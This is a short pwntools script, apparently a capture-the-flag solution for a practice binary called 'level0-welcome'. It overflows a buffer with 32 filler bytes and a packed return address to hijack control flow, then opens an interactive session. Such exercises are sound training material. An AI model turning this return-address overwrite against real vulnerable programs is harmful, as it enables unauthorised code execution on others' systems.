
from pwn import *

context.arch = "amd64"
io = process("./level0-welcome")
io.recv()
payload = b"A"*32+p64(0x000000000040075E)
io.sendline(payload)
io.interactive()
